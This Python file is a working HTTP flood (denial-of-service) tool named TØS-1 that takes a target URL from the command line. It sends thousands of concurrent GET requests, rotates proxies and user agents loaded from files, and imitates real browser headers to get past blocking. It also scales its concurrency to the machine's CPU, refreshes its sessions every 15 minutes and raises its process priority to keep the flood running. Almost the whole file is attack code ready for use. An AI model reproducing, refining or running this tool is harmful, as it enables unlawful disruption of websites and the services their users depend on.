import asyncio
import aiohttp
import random
import time
import os
import sys
from datetime import datetime
import psutil
import threading

class TOS1:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session_id = "S023"
        self.total_requests = 0
        self.running = True
        self.attack_active = True
        self.start_time = time.time()
        
        # Load resources
        self.proxies = self.load_file("main.txt")
        self.user_agents = self.load_file("ua.txt")
        
        # Headers rotation
        self.headers_pool = self.generate_real_headers()
        self.current_headers = {}
        self.current_proxy = ""
        self.current_ua = ""
        
        # Stats
        self.requests_since_last = 0
        self.last_rps_calc = time.time()
        self.current_rps = 0
        self.peak_rps = 0
        
        # Maintenance
        self.last_maintenance = time.time()
        self.maintenance_interval = 900  # 15 minutes
        
        # Performance control
        self.cpu_target = 0.89
        self.concurrency = 1000
        self.semaphore = asyncio.Semaphore(self.concurrency)
        
        # Session
        self.session = None
        
    def load_file(self, filename):
        """Load lines from file"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []
    
    def generate_real_headers(self):
        """Generate realistic looking headers"""
        base_headers = [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0'
            },
            {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            },
            {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Origin': 'https://www.google.com',
                'Referer': 'https://www.google.com/'
            }
        ]
        return base_headers
    
    def rotate_resources(self):
        """Rotate proxy, UA, and headers"""
        if self.proxies:
            self.current_proxy = random.choice(self.proxies)
        
        if self.user_agents:
            self.current_ua = random.choice(self.user_agents)
        
        self.current_headers = random.choice(self.headers_pool).copy()
        if self.current_ua:
            self.current_headers['User-Agent'] = self.current_ua
    
    def check_cpu(self):
        """Monitor and adjust CPU usage"""
        cpu_percent = psutil.cpu_percent(interval=0.1)
        
        if cpu_percent > self.cpu_target * 100:
            self.concurrency = max(100, self.concurrency - 50)
            self.semaphore = asyncio.Semaphore(self.concurrency)
        elif cpu_percent < self.cpu_target * 100 * 0.8:
            self.concurrency = min(5000, self.concurrency + 50)
            self.semaphore = asyncio.Semaphore(self.concurrency)
    
    async def create_session(self):
        """Create aiohttp session"""
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            force_close=True
        )
        
        timeout = aiohttp.ClientTimeout(total=10)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        )
    
    async def send_request(self):
        """Send single request"""
        if not self.session or not self.attack_active:
            return
        
        async with self.semaphore:
            try:
                proxy_url = f"http://{self.current_proxy}" if self.current_proxy else None
                
                async with self.session.get(
                    self.target_url,
                    headers=self.current_headers,
                    proxy=proxy_url,
                    ssl=False
                ) as response:
                    await response.read()
                    
            except Exception as e:
                pass  # Silent fail
            
            finally:
                self.total_requests += 1
                self.requests_since_last += 1
    
    def calculate_rps(self):
        """Calculate current RPS"""
        now = time.time()
        elapsed = now - self.last_rps_calc
        
        if elapsed >= 0.001:  # Every millisecond
            self.current_rps = self.requests_since_last / elapsed
            self.peak_rps = max(self.peak_rps, self.current_rps)
            self.requests_since_last = 0
            self.last_rps_calc = now
    
    def update_display(self):
        """Update display overwriting every millisecond"""
        self.calculate_rps()
        sys.stdout.write(f"\rTØS-TRS — {self.total_requests} | {{S023, TØS-RR}}")
        sys.stdout.flush()
    
    async def maintenance(self):
        """Perform maintenance every 15 minutes"""
        while self.running:
            current_time = time.time()
            
            if current_time - self.last_maintenance >= self.maintenance_interval:
                print(f"\n[!] TØS-MAINTENANCE ACTIVE")
                self.attack_active = False
                
                # Close old session
                if self.session:
                    await self.session.close()
                
                # Clear junk
                self.rotate_resources()
                
                # Create new session
                await self.create_session()
                
                # Wait a moment
                await asyncio.sleep(2)
                
                print("[+] MAINTENANCE COMPLETE")
                self.attack_active = True
                self.last_maintenance = current_time
            
            await asyncio.sleep(1)
    
    async def attack_loop(self):
        """Main attack loop"""
        await self.create_session()
        self.rotate_resources()
        
        # High RPS loop
        while self.running and self.attack_active:
            self.check_cpu()
            
            # Send batch of requests
            tasks = []
            for _ in range(min(self.concurrency, 100)):
                tasks.append(self.send_request())
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            self.update_display()
            
            # Small delay to prevent event loop blockage
            await asyncio.sleep(0.0001)
    
    async def run(self):
        """Main run method"""
        # Initial display
        print("\n" + "="*40)
        print("𝖳Ø𝖲-1 | 𝖲023")
        print("="*40)
        
        await asyncio.sleep(2)
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # Start maintenance in background
        maintenance_task = asyncio.create_task(self.maintenance())
        
        # Start attack
        try:
            await self.attack_loop()
        except KeyboardInterrupt:
            self.running = False
        finally:
            maintenance_task.cancel()
            if self.session:
                await self.session.close()
            
            # Final stats
            runtime = time.time() - self.start_time
            avg_rps = self.total_requests / runtime if runtime > 0 else 0
            
            print(f"\n\n=== TØS-1 FINAL STATS ===")
            print(f"Total Requests: {self.total_requests:,}")
            print(f"Peak RPS: {self.peak_rps:,.1f}")
            print(f"Average RPS: {avg_rps:,.1f}")
            print(f"Runtime: {runtime:.1f}s")
            print("="*30)

# Main execution
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python tos1.py https://target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Check for required files
    if not os.path.exists("main.txt"):
        print("Error: main.txt not found (proxies)")
        sys.exit(1)
    
    if not os.path.exists("ua.txt"):
        print("Error: ua.txt not found (user agents)")
        sys.exit(1)
    
    tos = TOS1(target)
    
    # Run with high priority
    try:
        if os.name == 'posix':
            os.nice(-20)  # Max priority on Linux
    except:
        pass
    
    asyncio.run(tos.run())
